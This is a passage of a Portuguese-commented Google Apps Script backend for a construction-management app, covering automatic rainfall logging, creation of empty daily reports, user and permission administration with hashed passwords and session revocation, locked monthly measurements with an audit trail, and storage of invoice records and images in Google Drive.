    if (f.getName().indexOf('BACKUP ') === 0) copias.push(f);
  }
  copias.sort(function (a, b) { return b.getDateCreated() - a.getDateCreated(); });
  for (var i = 14; i < copias.length; i++) copias[i].setTrashed(true);

  Logger.log('Backup criado: ' + nome + ' (' + copias.length + ' cópias na pasta).');
  return { ok: true, backup: nome };
}

// ------------------------------------------------------------
// CLIMA AUTOMÁTICO — grava a chuva de ONTEM na aba RDO_Diario, colunas
// Chuva_mm_Auto e Clima_Fonte (criadas automaticamente se não existirem).
// Contraprova objetiva do clima apontado — base para pleitos de
// prorrogação por dias improdutivos.
//
// A fonte é a MESMA do botão do RDO (climaDoDia → INMET, estação mais
// perto de cada obra). Antes esta rotina buscava na Open-Meteo, num par
// de coordenadas fixo da Teotônio: dava para o mesmo dia aparecer "Bom"
// nos campos de clima, que vinham do INMET, e 12 mm na coluna ao lado,
// que vinha de outro provedor. Pior, a Open-Meteo gratuita é licenciada
// só para uso NÃO comercial — o que o comentário do climaDoDia já dizia,
// enquanto esta função usava exatamente esse tier.
//
// E rodava para UMA obra só: o Ranário e as Ruas de Terra nunca
// receberam contraprova nenhuma. Agora percorre todas as obras
// declaradas em CLIMA_OBRAS.
// ------------------------------------------------------------
function registrarClimaAuto() {
  var ontem = new Date(Date.now() - 24 * 3600 * 1000);
  var iso = Utilities.formatDate(ontem, Session.getScriptTimeZone(), 'yyyy-MM-dd');

  var aba = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(NOME_ABA_DIARIO);
  if (!aba) return { ok: false, error: 'Aba "' + NOME_ABA_DIARIO + '" não encontrada' };

  var resultados = [];
  Object.keys(CLIMA_OBRAS).forEach(function (id) {
    try {
      resultados.push(registrarClimaDaObra_(aba, id, iso));
    } catch (e) {
      resultados.push({ obra: id, ok: false, error: String(e) });
    }
  });

  Logger.log('Clima de ' + iso + ': ' + JSON.stringify(resultados));
  // Uma obra sem dado não pode derrubar as outras: o gatilho só é
  // "falha" quando NENHUMA obra conseguiu registrar.
  return { ok: resultados.some(function (r) { return r.ok; }), data: iso, obras: resultados };
}

function registrarClimaDaObra_(aba, obraId, iso) {
  var clima = climaDoDia(iso, obraId);
  if (!clima.ok) return { obra: obraId, ok: false, error: clima.motivo };

  var chuva = clima.total_mm;
  var fonte = clima.fonte;

  var lock = LockService.getScriptLock();
  lock.waitLock(30000);
  try {
    var cab = cabecalhoNormalizado(aba);
    // Cria as colunas de clima automático se ainda não existirem.
    if (idxColuna(cab, 'chuva_mm_auto') === -1) {
      aba.getRange(1, aba.getLastColumn() + 1).setValue('Chuva_mm_Auto');
      cab = cabecalhoNormalizado(aba);
    }
    if (idxColuna(cab, 'clima_fonte') === -1) {
      aba.getRange(1, aba.getLastColumn() + 1).setValue('Clima_Fonte');
      cab = cabecalhoNormalizado(aba);
    }
    var iData = idxColuna(cab, 'data');
    var iChuva = idxColuna(cab, 'chuva_mm_auto');
    var iFonte = idxColuna(cab, 'clima_fonte');
    var iId = idxColuna(cab, 'id');
    var iObraC = idxColuna(cab, 'obra');
    var dados2 = aba.getDataRange().getValues();

    // A chuva é da estação DESTA obra, então só carimba o diário dela.
    // Sem o filtro, o primeiro diário daquela data — de qualquer obra —
    // receberia a chuva de outra cidade.
    for (var i = 1; i < dados2.length; i++) {
      if (iObraC !== -1 && normObra(dados2[i][iObraC]) !== obraId) continue;
      if (normData(dados2[i][iData]) === iso) {
        aba.getRange(i + 1, iChuva + 1).setValue(chuva);
        aba.getRange(i + 1, iFonte + 1).setValue(fonte);
        return { obra: obraId, ok: true, chuva_mm: chuva, estacao: clima.estacao, atualizado: true };
      }
    }

    // Não havia RDO na data: cria linha mínima só com data + chuva,
    // para o dia ficar documentado mesmo sem apontamento.
    garantirColuna(aba, 'obra');
    var registro = { obra: obraId };
    registro['data'] = iso;
    registro['chuva_mm_auto'] = chuva;
    registro['clima_fonte'] = fonte;
    registro['tem_turno_noturno'] = 'false';
    if (iId !== -1) registro['id'] = gerarIdDiario(dados2, iId);
    var cab2 = cabecalhoNormalizado(aba);
    var linha = cab2.map(function (nc) { return registro.hasOwnProperty(nc) ? registro[nc] : ''; });
    aba.getRange(aba.getLastRow() + 1, 1, 1, cab2.length).setValues([linha]);
    return { obra: obraId, ok: true, chuva_mm: chuva, estacao: clima.estacao, inserido: true };
  } finally {
    lock.releaseLock();
  }
}

// ------------------------------------------------------------
// RDOs VAZIOS — versão GENÉRICA (qualquer mês/ano) do utilitário
// de maio/26. Edite ANO_MES_ALVO e rode criarRDOsVaziosDoMes().
// Feriados: nacionais + municipais de São Paulo.
// ------------------------------------------------------------
var ANO_MES_ALVO = '2026-06'; // <-- ajuste aqui antes de rodar

var FERIADOS_OBRA = [
  '2026-01-01', '2026-01-25', '2026-02-16', '2026-02-17', '2026-04-03', '2026-04-21',
  '2026-05-01', '2026-06-04', '2026-07-09', '2026-09-07', '2026-10-12', '2026-11-02',
  '2026-11-15', '2026-11-20', '2026-12-25',
  '2027-01-01', '2027-01-25'
];

function criarRDOsVaziosDoMes() {
  var partes = String(ANO_MES_ALVO).split('-');
  return criarRDOsVazios(parseInt(partes[0], 10), parseInt(partes[1], 10), true);
}

function criarRDOsVazios(ano, mes, incluirDiasUteis) {
  var aba = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(NOME_ABA_DIARIO);
  if (!aba) return { ok: false, error: 'Aba "' + NOME_ABA_DIARIO + '" não encontrada' };

  var lock = LockService.getScriptLock();
  lock.waitLock(60000);
  try {
    garantirColuna(aba, 'obra');
    var cab = cabecalhoNormalizado(aba);
    var iData = idxColuna(cab, 'data');
    var iId = idxColuna(cab, 'id');
    var iObraV = idxColuna(cab, 'obra');
    var dados = aba.getDataRange().getValues();

    // "já existe RDO nesta data" é por OBRA: data preenchida no Ranário não
    // pode impedir a criação do dia vazio da Teotônio.
    var existentes = {};
    for (var i = 1; i < dados.length; i++) {
      if (iObraV !== -1 && normObra(dados[i][iObraV]) !== OBRA_ID) continue;
      var nd = normData(dados[i][iData]);
      if (nd) existentes[nd] = true;
    }

    var ultimoDia = new Date(ano, mes, 0).getDate();
    var criados = [], uteisSemRDO = [], jaTinham = 0;
    for (var dia = 1; dia <= ultimoDia; dia++) {
      var d = new Date(ano, mes - 1, dia);
      var iso = Utilities.formatDate(d, Session.getScriptTimeZone(), 'yyyy-MM-dd');
      var dow = d.getDay();
      var util = (dow !== 0 && dow !== 6) && FERIADOS_OBRA.indexOf(iso) === -1;

      if (existentes[iso]) { jaTinham++; continue; }
      if (util && !incluirDiasUteis) { uteisSemRDO.push(iso); continue; }

      var registro = {};
      registro['obra'] = OBRA_ID;   // o dia vazio é desta obra, não das outras
      registro['data'] = iso;
      if (iId !== -1) registro['id'] = gerarIdDiario(dados, iId);
      registro['tem_turno_noturno'] = 'false';
      if (!util) registro['observacoes_gerais'] = 'Dia não útil — sem serviços';

      var linha = cab.map(function (nc) { return registro.hasOwnProperty(nc) ? registro[nc] : ''; });
      aba.appendRow(linha);
      dados.push(linha);
      existentes[iso] = true;
      criados.push(registro['id'] + ' ' + iso + (util ? ' (útil, vazio)' : ' (não útil)'));
    }

    var resultado = { ok: true, mes: ano + '-' + ('0' + mes).slice(-2), totalCriados: criados.length, criados: criados, jaTinham: jaTinham, diasUteisSemRDO: uteisSemRDO };
    Logger.log(JSON.stringify(resultado, null, 2));
    return resultado;
  } finally {
    lock.releaseLock();
  }
}

// ============================================================
// USUÁRIOS E PERFIS — mexe na propriedade USUARIOS do script, a
// mesma que o login lê. Regras que valem AQUI, não no app:
//   • só o perfil admin entra;
//   • só funciona com EXIGIR_TOKEN=true — sem token o backend está
//     aberto, e deixar isso reescrever a lista de senhas seria dar a
//     chave da casa para quem descobrir a URL do /exec;
//   • senha sai daqui HASHEADA e nunca volta para o app;
//   • ninguém se exclui, e o sistema não pode ficar sem admin.
//
// Perfis (mesma régua do app "Gestor — Controle de Obras"):
//   campo · administrativo · engenharia · diretoria · admin
// ============================================================
var PERFIS_VALIDOS = ['campo', 'administrativo', 'engenharia', 'diretoria', 'admin'];

function usuariosCarregar() {
  var raw = PropertiesService.getScriptProperties().getProperty('USUARIOS');
  if (!raw) return {};
  try { return JSON.parse(raw) || {}; } catch (e) { return {}; }
}

function usuariosGravar(mapa) {
  PropertiesService.getScriptProperties().setProperty('USUARIOS', JSON.stringify(mapa));
}

// Perfil de uma entrada, aceitando o formato antigo ("Nome": "senha").
function usuarioPerfilDe(nome, conf) {
  if (conf && typeof conf === 'object' && conf.perfil) return String(conf.perfil).toLowerCase();
  return String(nome).toLowerCase() === 'leonardo' ? 'admin' : 'engenharia';
}

/* ------------------------------------------------------------------
   OBRAS QUE O USUÁRIO ENXERGA
   ------------------------------------------------------------------
   '*'            → todas as obras (padrão)
   ['ranario',…]  → só as listadas

   Usuário cadastrado ANTES desta versão não tem o campo, e recebe '*':
   ninguém pode perder acesso por causa de uma atualização. Restringir é
   ato deliberado do administrador, nunca efeito colateral.
   ------------------------------------------------------------------ */
function usuarioObrasDe(conf) {
  if (!conf || typeof conf !== 'object') return '*';
  var o = conf.obras;
  if (o === undefined || o === null || o === '*') return '*';
  if (!Array.isArray(o)) return '*';
  var limpa = o.map(function (x) { return String(x || '').trim(); }).filter(Boolean);
  return limpa.length ? limpa : '*';   // lista vazia seria "nenhuma obra": não é o que se quer dizer
}

/* A sessão pode gravar NESTA obra? Vale no servidor, não só na tela:
   esconder a obra no menu não impede um pedido direto para a URL /exec. */
function sessaoPodeNaObra(sess, obra) {
  if (!sess) return true;                    // sem token, quem barra é o exigirTokenSeAtivo
  var permitidas = sess.obras === undefined ? '*' : sess.obras;
  if (permitidas === '*') return true;
  if (!Array.isArray(permitidas)) return true;
  return permitidas.indexOf(normObra(obra)) !== -1;
}

/* Recusa padronizada, com registro — tentativa negada não pode ser silenciosa. */
function negarPorObra(token, acao, obra) {
  var s = sessaoDoToken(token);
  registrarAuditoria(s ? s.usuario : 'desconhecido', s ? s.perfil : '',
    acao + ' NEGADO', normObra(obra), '', '', 'usuário sem acesso a esta obra');
  return { ok: false, error: 'SEM_ACESSO_A_OBRA',
    mensagem: 'Seu usuário não tem acesso a esta obra. Fale com o administrador.' };
}

function usuarioSenhaDe(conf) {
  if (conf && typeof conf === 'object') return conf.senha || '';
  return conf || '';
}

function contarAdmins(mapa, ignorar) {
  var n = 0;
  Object.keys(mapa).forEach(function (k) {
    if (ignorar && k === ignorar) return;
    if (usuarioPerfilDe(k, mapa[k]) === 'admin') n++;
  });
  return n;
}

function exigirAdmin(token) {
  var props = PropertiesService.getScriptProperties();
  if (String(props.getProperty('EXIGIR_TOKEN')).toLowerCase() !== 'true') {
    return { ok: false, error: 'ADMIN_REQUER_TOKEN',
      mensagem: 'Para gerenciar usuários, a propriedade EXIGIR_TOKEN precisa estar como true. Sem ela o backend fica aberto.' };
  }
  if (!sessaoDoToken(token)) return { ok: false, error: 'TOKEN_INVALIDO' };
  if (perfilDoToken(token) !== 'admin') {
    return { ok: false, error: 'SEM_PERMISSAO', mensagem: 'Só o administrador gerencia usuários.' };
  }
  return null;
}

function usuariosListar(token) {
  var falha = exigirAdmin(token); if (falha) return falha;
  var mapa = usuariosCarregar();
  var lista = Object.keys(mapa).sort(function (a, b) { return a.localeCompare(b); }).map(function (nome) {
    return {
      nome: nome,
      perfil: usuarioPerfilDe(nome, mapa[nome]),
      obras: usuarioObrasDe(mapa[nome]),
      // "formatoAntigo" = senha ainda em texto puro na propriedade
      formatoAntigo: typeof mapa[nome] !== 'object',
      temSenha: !!usuarioSenhaDe(mapa[nome])
    };
  });
  return { ok: true, usuarios: lista, eu: usuarioDoToken(token) };
}

/* ------------------------------------------------------------
   MEDIÇÃO FECHADA POR COMPETÊNCIA
   ------------------------------------------------------------
   `rdosDoMes()` do app recalcula a prévia do zero a cada abertura da tela.
   Um lançamento retroativo — correção, foto que faltava, dia esquecido —
   altera em silêncio o número de um mês JÁ MEDIDO E JÁ PAGO, e nada no
   sistema registra o que foi efetivamente apresentado à fiscalização.

   Fechar a competência congela o snapshot do que foi entregue. O
   lançamento retroativo continua sendo aceito (ele é legítimo: o serviço
   foi feito naquele dia); o que muda é que a divergência passa a ser
   VISÍVEL, em vez de reescrever o passado sem ninguém ver.
   ------------------------------------------------------------ */
function medicaoListar(obra) {
  var aba = getOrCreateAba('Medicoes');
  var cab = cabecalhoNormalizado(aba);
  var dados = aba.getDataRange().getValues();
  var alvo = normObra(obra);
  var iObra = idxColuna(cab, 'obra');
  var out = [];
  for (var i = 1; i < dados.length; i++) {
    if (iObra !== -1 && normObra(dados[i][iObra]) !== alvo) continue;
    var o = {};
    cab.forEach(function (nome, k) { o[nome] = dados[i][k]; });
    // `itens` é JSON; devolve como texto e o app decide quando abrir
    out.push(o);
  }
  return { ok: true, medicoes: out };
}

function medicaoFechar(p) {
  var perfil = perfilDoToken(p.token);
  // Fechar medição é ato de quem responde por ela: engenharia ou admin.
  if (perfil && perfil !== 'admin' && perfil !== 'engenharia') {
    return negarPorPermissao(p.token, 'medicaoFechar', p.competencia, '');
  }
  var comp = String(p.competencia || '').trim();
  if (!/^\d{4}-\d{2}$/.test(comp)) return { ok: false, error: 'competência inválida (use AAAA-MM)' };

  var lock = LockService.getScriptLock();
  lock.waitLock(30000);
  try {
    var aba = getOrCreateAba('Medicoes');
    var cab = cabecalhoNormalizado(aba);
    var dados = aba.getDataRange().getValues();
    var alvo = normObra(p.obra);
    var iObra = idxColuna(cab, 'obra'), iComp = idxColuna(cab, 'competencia'),
        iReab = idxColuna(cab, 'reaberta');

    for (var i = 1; i < dados.length; i++) {
      if (normObra(dados[i][iObra]) === alvo && String(dados[i][iComp]).trim() === comp
          && String(dados[i][iReab]).trim().toLowerCase() !== 'sim') {
        return { ok: false, error: 'JA_FECHADA', mensagem: 'A competência ' + comp + ' já está fechada.' };
      }
    }

    var reg = {
      id: 'M' + comp.replace('-', '') + '_' + Utilities.getUuid().slice(0, 6),
      obra: alvo, competencia: comp,
      fechadaEm: new Date(), fechadaPor: usuarioDoToken(p.token) || p.usuario || '',
      itens: String(p.itens || '[]'), observacao: String(p.observacao || ''),
      reaberta: '', reabertaEm: '', reabertaPor: ''
    };
    var linha = cab.map(function (n) { return reg.hasOwnProperty(n) ? reg[n] : ''; });
    aba.getRange(aba.getLastRow() + 1, 1, 1, cab.length).setValues([seguroLinha(linha)]);
    registrarAuditoria(reg.fechadaPor, perfil, 'medicaoFechar', alvo, comp, '', reg.itens.length + ' bytes de snapshot');
    return { ok: true, id: reg.id, competencia: comp };
  } catch (err) {
    return { ok: false, error: String(err && err.message ? err.message : err) };
  } finally {
    lock.releaseLock();
  }
}

/* Reabrir NÃO apaga a linha: marca a antiga como reaberta e deixa o rastro.
   Medição que foi apresentada e depois reaberta é fato do contrato, e some
   da planilha exatamente quando mais faz falta. */
function medicaoReabrir(p) {
  var perfil = perfilDoToken(p.token);
  if (perfil && perfil !== 'admin' && perfil !== 'engenharia') {
    return negarPorPermissao(p.token, 'medicaoReabrir', p.competencia, '');
  }
  var comp = String(p.competencia || '').trim();
  var lock = LockService.getScriptLock();
  lock.waitLock(30000);
  try {
    var aba = getOrCreateAba('Medicoes');
    var cab = cabecalhoNormalizado(aba);
    var dados = aba.getDataRange().getValues();
    var alvo = normObra(p.obra);
    var iObra = idxColuna(cab, 'obra'), iComp = idxColuna(cab, 'competencia'),
        iReab = idxColuna(cab, 'reaberta'), iRem = idxColuna(cab, 'reabertaem'),
        iRpor = idxColuna(cab, 'reabertapor');
    for (var i = dados.length - 1; i >= 1; i--) {
      if (normObra(dados[i][iObra]) === alvo && String(dados[i][iComp]).trim() === comp
          && String(dados[i][iReab]).trim().toLowerCase() !== 'sim') {
        aba.getRange(i + 1, iReab + 1).setValue('sim');
        if (iRem !== -1) aba.getRange(i + 1, iRem + 1).setValue(new Date());
        if (iRpor !== -1) aba.getRange(i + 1, iRpor + 1).setValue(usuarioDoToken(p.token) || '');
        registrarAuditoria(usuarioDoToken(p.token), perfil, 'medicaoReabrir', alvo, comp, 'fechada', 'reaberta');
        return { ok: true, competencia: comp };
      }
    }
    return { ok: false, error: 'NAO_ENCONTRADA', mensagem: 'Não há medição fechada em ' + comp + '.' };
  } catch (err) {
    return { ok: false, error: String(err && err.message ? err.message : err) };
  } finally {
    lock.releaseLock();
  }
}

function usuariosNomes() {
  var mapa = usuariosCarregar();
  var lista = Object.keys(mapa).sort(function (a, b) { return a.localeCompare(b); });
  return { ok: true, usuarios: lista };
}

function usuarioSalvar(p) {
  var falha = exigirAdmin(p.token); if (falha) return falha;
  var nome = String(p.nome || '').trim();
  var perfil = String(p.perfil || '').toLowerCase().trim();
  var senha = String(p.senha || '');
  var nomeAntigo = String(p.nomeAntigo || '').trim();

  if (!nome) return { ok: false, error: 'NOME_OBRIGATORIO', mensagem: 'Informe o nome do usuário.' };
  if (nome.length > 40) return { ok: false, error: 'NOME_LONGO', mensagem: 'Nome muito longo.' };
  if (PERFIS_VALIDOS.indexOf(perfil) === -1) {
    return { ok: false, error: 'PERFIL_INVALIDO', mensagem: 'Perfil desconhecido: ' + perfil };
  }

  var mapa = usuariosCarregar();
  var eu = usuarioDoToken(p.token);
  var editando = nomeAntigo && mapa[nomeAntigo];

  if (!editando && mapa[nome]) {
    return { ok: false, error: 'JA_EXISTE', mensagem: 'Já existe um usuário com esse nome.' };
  }
  if (editando && nomeAntigo !== nome && mapa[nome]) {
    return { ok: false, error: 'JA_EXISTE', mensagem: 'Já existe um usuário com esse nome.' };
  }

  var senhaFinal = senha ? hashSenha(senha) : (editando ? usuarioSenhaDe(mapa[nomeAntigo]) : '');
  if (!senhaFinal) return { ok: false, error: 'SENHA_OBRIGATORIA', mensagem: 'Defina uma senha para o usuário novo.' };
  if (senha && senha.length < 4) return { ok: false, error: 'SENHA_CURTA', mensagem: 'A senha precisa de pelo menos 4 caracteres.' };

  // o sistema não pode ficar sem nenhum administrador
  var perfilAnterior = editando ? usuarioPerfilDe(nomeAntigo, mapa[nomeAntigo]) : '';
  if (editando && perfilAnterior === 'admin' && perfil !== 'admin' && contarAdmins(mapa, nomeAntigo) === 0) {
    return { ok: false, error: 'SEM_ADMIN', mensagem: 'Este é o único administrador. Promova outra pessoa antes de rebaixá-lo.' };
  }
  if (editando && nomeAntigo === eu && perfil !== 'admin') {
    return { ok: false, error: 'AUTO_REBAIXA', mensagem: 'Você não pode tirar o seu próprio acesso de administrador.' };
  }

  // OBRAS: chega como lista separada por vírgula, ou vazio/'*' para todas.
  // Campo AUSENTE na chamada (backend antigo, formulário sem o campo) mantém
  // o que já estava — nunca restringe por omissão.
  var obrasFinal;
  if (p.obras === undefined || p.obras === null) {
    obrasFinal = editando ? usuarioObrasDe(mapa[nomeAntigo]) : '*';
  } else {
    var txt = String(p.obras).trim();
    if (!txt || txt === '*') obrasFinal = '*';
    else {
      obrasFinal = txt.split(',').map(function (x) { return x.trim(); }).filter(Boolean);
      if (!obrasFinal.length) obrasFinal = '*';
    }
  }
  // Administrador enxerga tudo por definição: restringir obra para admin
  // criaria a situação de não poder consertar o acesso de ninguém.
  if (perfil === 'admin') obrasFinal = '*';

  if (editando && nomeAntigo !== nome) delete mapa[nomeAntigo];
  mapa[nome] = { senha: senhaFinal, perfil: perfil, obras: obrasFinal };
  usuariosGravar(mapa);

  /* A sessão carrega perfil e obras congelados do login. Trocar a senha,
     rebaixar o perfil, renomear ou restringir obras não valia nada enquanto
     o token antigo continuasse aceito — a pessoa seguia com o acesso velho.
     Quem mudou de fato é derrubado e entra de novo; quem só teve o cadastro
     tocado sem mudar nada disso continua onde está.
     Exceção: o próprio admin que está mexendo não se derruba, senão ele perde
     a tela no meio do trabalho. */
  var derrubadas = 0;
  var mudouAcesso = !!senha || (editando && (perfil !== perfilAnterior || nomeAntigo !== nome ||
    JSON.stringify(usuarioObrasDe(mapa[nome])) !== JSON.stringify(obrasFinal)));
  if (editando && mudouAcesso) {
    if (nomeAntigo !== eu) derrubadas += sessoesDoUsuarioRevogar(nomeAntigo, 'cadastro alterado');
    if (nome !== nomeAntigo && nome !== eu) derrubadas += sessoesDoUsuarioRevogar(nome, 'cadastro alterado');
  }

  registrarAuditoria(eu, 'admin', editando ? 'usuarioAlterar' : 'usuarioCriar', OBRA_ID, nome,
    editando ? (nomeAntigo + ' · ' + perfilAnterior) : '',
    nome + ' · ' + perfil + (senha ? ' · senha trocada' : '') +
    (derrubadas ? ' · sessões derrubadas: ' + derrubadas : ''));
  return { ok: true, nome: nome, perfil: perfil, sessoesDerrubadas: derrubadas };
}

function usuarioExcluir(p) {
  var falha = exigirAdmin(p.token); if (falha) return falha;
  var nome = String(p.nome || '').trim();
  var mapa = usuariosCarregar();
  if (!mapa[nome]) return { ok: false, error: 'NAO_ENCONTRADO', mensagem: 'Usuário não encontrado.' };

  var eu = usuarioDoToken(p.token);
  if (nome === eu) return { ok: false, error: 'AUTO_EXCLUSAO', mensagem: 'Você não pode excluir o seu próprio usuário.' };
  if (usuarioPerfilDe(nome, mapa[nome]) === 'admin' && contarAdmins(mapa, nome) === 0) {
    return { ok: false, error: 'SEM_ADMIN', mensagem: 'Não dá para excluir o único administrador.' };
  }

  delete mapa[nome];
  usuariosGravar(mapa);
  // Sem isto, o excluído seguia dentro do sistema com o token que já tinha.
  var derrubadas = sessoesDoUsuarioRevogar(nome, 'usuário excluído');
  registrarAuditoria(eu, 'admin', 'usuarioExcluir', OBRA_ID, nome, '',
    'sessões derrubadas: ' + derrubadas);
  return { ok: true, removido: true, sessoesDerrubadas: derrubadas };
}

// Utilitário de migração (rodar 1× no editor): converte as senhas em texto da
// propriedade USUARIOS para hash, preservando o perfil de cada um. Depois de
// rodar, o login continua aceitando as MESMAS senhas — só a propriedade deixa
// de mostrá-las para quem abrir o projeto.
function migrarSenhasParaHash() {
  var mapa = usuariosCarregar();
  var mudou = 0;
  Object.keys(mapa).forEach(function (nome) {
    var conf = mapa[nome];
    var senha = usuarioSenhaDe(conf);
    if (!senha) return;
    if (String(senha).length === 64 && /^[0-9a-f]+$/.test(String(senha))) return; // já é hash
    mapa[nome] = { senha: hashSenha(senha), perfil: usuarioPerfilDe(nome, conf) };
    mudou++;
  });
  usuariosGravar(mapa);
  Logger.log(mudou + ' usuário(s) migrado(s) para senha hasheada.');
  return { ok: true, migrados: mudou };
}


// ============================================================
// PONTE PARA O MÓDULO DE NOTAS FISCAIS
// O bloco abaixo é o mesmo do app "Gestor — Controle de Obras" e usa
// os helpers com os nomes de lá. Estes apelidos evitam ter que mexer
// no código copiado — quando ele for corrigido do outro lado, basta
// copiar de novo.
// ============================================================
function aba(nome) { return getOrCreateAba(nome); }
function getOrCreate(nome) { return getOrCreateAba(nome); }
function cabecalho(a) {
  return a.getRange(1, 1, 1, a.getLastColumn()).getValues()[0]
          .map(function (h) { return String(h).trim().toLowerCase(); });
}
function idxCol(cab, nome) { return idxColuna(cab, nome); }

// ============================================================
// NOTAS FISCAIS (DANFE) — armazenamento, imagem no Drive e leitura por IA
// ============================================================

// Pasta no Drive: Notas Fiscais Teotônio (Privado) / <obra> / <ano> / <mes>
var NF_MESES = ['Janeiro','Fevereiro','Março','Abril','Maio','Junho','Julho','Agosto','Setembro','Outubro','Novembro','Dezembro'];

function nfPastaRaiz() {
  var it = DriveApp.getFoldersByName(NF_PASTA_RAIZ);
  return it.hasNext() ? it.next() : DriveApp.createFolder(NF_PASTA_RAIZ);
}

function nfSubpasta(pai, nome) {
  var it = pai.getFoldersByName(nome);
  return it.hasNext() ? it.next() : pai.createFolder(nome);
}

// competencia no formato YYYY-MM; devolve a pasta do mes daquela obra
function nfPastaDaNota(obra, competencia) {
  var comp = String(competencia || '');
  if (!/^\d{4}-\d{2}$/.test(comp)) {
    comp = Utilities.formatDate(new Date(), Session.getScriptTimeZone(), 'yyyy-MM');
  }
  var ano = comp.slice(0, 4);
  var mes = NF_MESES[parseInt(comp.slice(5, 7), 10) - 1] || comp.slice(5, 7);
  var pObra = nfSubpasta(nfPastaRaiz(), String(obra || 'obra'));
  return nfSubpasta(nfSubpasta(pObra, ano), mes);
}

function nfListar(obra) {
  var notas = linhasObj(ABA_NF, obra).map(function (n) {
    n.dataEmissao = normData(n.dataEmissao);
    n.dataEntrada = normData(n.dataEntrada);
    return n;
  });
  var saidas = linhasObj(ABA_SAIDA, obra).map(function (s) {
    s.data = normData(s.data);
    return s;
  });
  return { ok: true, notas: notas, saidas: saidas };
}

// upsert pelo clientId — reenviar a mesma nota nunca duplica a linha
function nfSalvar(p) {
  var a = getOrCreate(ABA_NF);
  // Nota de mais de uma folha guarda aqui os arquivos das páginas 2 em
  // diante. A coluna nasce na primeira gravação que precisar dela — a
  // planilha em uso não tem de ser editada à mão antes, e quem só lança
  // nota de uma folha nunca ganha a coluna.
  var pagsTxt = typeof p.paginas === 'string' ? p.paginas : JSON.stringify(p.paginas || []);
  var temPaginas = !!pagsTxt && pagsTxt !== '[]' && pagsTxt !== 'null';
  if (temPaginas) garantirColuna(a, 'paginas');
  var cab = cabecalho(a);
  var dados = a.getDataRange().getValues();
  var iCli = idxCol(cab, 'clientid');
  var clientId = String(p.clientId || p.id || '').trim();
  if (!clientId) return { ok: false, error: 'clientId não informado' };

  var reg = {
    id: p.id || clientId,
    clientid: clientId,
    obra: p.obra || '',
    numero: p.numero || '',
    serie: p.serie || '',
    chave: "'" + String(p.chave || ''),          // apóstrofo: a planilha não converte 44 dígitos em notação científica
    dataemissao: normData(p.dataemissao),
    dataentrada: normData(p.dataentrada),
    cnpj: "'" + String(p.cnpj || ''),
    razaosocial: p.razaosocial || '',
    nomefantasia: p.nomefantasia || '',
    municipio: p.municipio || '',
    uf: p.uf || '',
    vprod: Number(p.vprod || 0),
    vfrete: Number(p.vfrete || 0),
    vtotal: Number(p.vtotal || 0),
    vbaseicms: Number(p.vbaseicms || 0),
    vicms: Number(p.vicms || 0),
    itens: typeof p.itens === 'string' ? p.itens : JSON.stringify(p.itens || []),
    obs: p.obs || '',
    responsavel: p.responsavel || '',
    status: p.status || 'Recebida',
    driveid: p.driveid || '',
    drivelink: p.drivelink || '',
    paginas: pagsTxt,
    leitura: typeof p.leitura === 'string' ? p.leitura : JSON.stringify(p.leitura || {}),
    historico: typeof p.historico === 'string' ? p.historico : JSON.stringify(p.historico || []),
    /* O DONO vem do TOKEN, nunca do que o cliente declarou. Este campo é o
       que a regra "só admin ou quem lançou apaga" consulta e o que vai para a
       Auditoria: aceitar `p.usuario` era deixar qualquer um assinar em nome de
       outro — e apagar o registro alheio. Só cai no que veio do cliente quando
       não há sessão (EXIGIR_TOKEN desligado), que é o modo de implantação. */
    usuario: usuarioDoToken(p.token) || p.usuario || '',
    criadoem: p.criadoem || Date.now(),
    atualizadoem: Date.now()
  };

  var linha = cab.map(function (nc) { return reg.hasOwnProperty(nc) ? reg[nc] : ''; });
  var achou = -1;
  if (iCli !== -1) {
    for (var i = 1; i < dados.length; i++) {
      if (String(dados[i][iCli]).trim() === clientId) { achou = i; break; }
    }
  }
  if (achou > -1) {
    // preserva o arquivo do Drive quando o app reenvia a nota sem essa informação
    var iDid = idxCol(cab, 'driveid'), iDlk = idxCol(cab, 'drivelink'), iPag = idxCol(cab, 'paginas');
    if (iDid !== -1 && !reg.driveid) linha[iDid] = dados[achou][iDid];
    if (iDlk !== -1 && !reg.drivelink) linha[iDlk] = dados[achou][iDlk];
    // reenvio da nota SEM a lista de páginas não pode apagar as que já subiram
    if (iPag !== -1 && !temPaginas) linha[iPag] = dados[achou][iPag];
    a.getRange(achou + 1, 1, 1, cab.length).setValues([seguroLinha(linha)]);
  } else {
    a.getRange(a.getLastRow() + 1, 1, 1, cab.length).setValues([seguroLinha(linha)]);
  }
  registrarAuditoria(reg.usuario, 'app', achou > -1 ? 'nfAlterar' : 'nfCadastrar', reg.obra, clientId, '', 'NF ' + reg.numero + ' · ' + reg.status + ' · R$ ' + reg.vtotal);
  return { ok: true, id: reg.id, clientId: clientId, atualizado: achou > -1 };
}

function nfExcluir(obra, id, token) {
  var a = getOrCreate(ABA_NF);
  var dados = a.getDataRange().getValues();
  var cab = dados[0].map(function (h) { return String(h).trim().toLowerCase(); });
  var iId = idxCol(cab, 'id'), iCli = idxCol(cab, 'clientid');
  for (var i = dados.length - 1; i >= 1; i--) {
    var bate = (iId !== -1 && String(dados[i][iId]).trim() === String(id).trim()) ||
               (iCli !== -1 && String(dados[i][iCli]).trim() === String(id).trim());
    if (bate) {
      var iUsu = idxCol(cab, 'usuario');
      if (!podeApagarLinha(token, iUsu !== -1 ? dados[i][iUsu] : '')) {
        registrarAuditoria(usuarioDoToken(token), perfilDoToken(token), 'EXCLUSAO_NEGADA', obra, id, '', 'nota fiscal');
        return { ok: false, error: 'SEM_PERMISSAO', mensagem: 'Só quem lançou ou o administrador pode excluir esta nota.' };
      }
      a.deleteRow(i + 1);
      registrarAuditoria(usuarioDoToken(token), perfilDoToken(token), 'nfExcluir', obra, id, '', '');
      return { ok: true, removido: true };
    }
  }
  return { ok: true, removido: false };
}

// guarda a imagem da nota no Drive, organizada por Obra -> Ano -> Mes
/* `pagina` (1 em diante) permite guardar a NOTA INTEIRA, e não só a primeira
   folha. Nota fiscal de duas páginas é comum — a segunda costuma trazer a
   continuação dos itens — e antes ela era simplesmente descartada.

   A página 1 continua exatamente como era: mesmo nome de arquivo, e é ela
   que preenche `driveId`/`driveLink` na planilha. As demais ganham sufixo
   no nome e voltam só como `fileId`; quem monta a lista é o app, que grava
   tudo na coluna `paginas`. Assim nota antiga, de uma folha só, não muda
   em nada. */
function nfImagem(p) {
  var b64 = String(p.foto || '');
  if (b64.indexOf('data:image') !== 0) return { ok: false, error: 'Imagem inválida' };
  var pagina = parseInt(p.pagina, 10);
